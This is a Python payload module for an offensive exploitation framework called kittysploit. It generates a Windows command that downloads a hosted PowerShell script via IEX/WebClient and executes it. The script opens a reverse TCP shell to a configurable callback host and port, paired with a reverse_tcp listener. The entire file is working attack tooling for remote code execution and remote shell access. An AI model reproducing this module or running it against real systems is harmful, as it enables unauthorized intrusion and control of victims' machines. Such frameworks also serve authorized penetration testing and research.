#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *

from lib.c2.download_stagers import build_powershell_iex_download, build_stager_url


class Module(Payload):
    CLIENT_LANGUAGE = "powershell"

    __info__ = {
        "name": "Windows Download Stager, PowerShell IEX (reverse TCP)",
        "description": (
            "Downloads and executes a hosted PowerShell stager via IEX / WebClient. "
            "Host a .ps1 reverse shell script on stager_port, or set stager_url. "
            "Pairs with listeners/multi/reverse_tcp."
        ),
        "category": PayloadCategory.CMD,
        "platform": Platform.WINDOWS,
        "listener": "listeners/multi/reverse_tcp",
        "handler": Handler.REVERSE,
        "session_type": SessionType.SHELL,
    }

    lhost = OptString("127.0.0.1", "Callback host (for stager URL hint)", True)
    lport = OptPort(4444, "Callback port", True)
    stager_url = OptString("", "Full URL of hosted .ps1 stager", False)
    stager_port = OptInteger(8000, "Operator HTTP port when stager_url is empty", False, advanced=True)

    def generate(self):
        url = str(self.stager_url or "").strip()
        if not url:
            url = build_stager_url(str(self.lhost), int(self.stager_port or 8000), "/stager.ps1")
            print_info(f"stager_url not set — using {url} (host reverse TCP .ps1 on stager_port)")
        return build_powershell_iex_download(url)
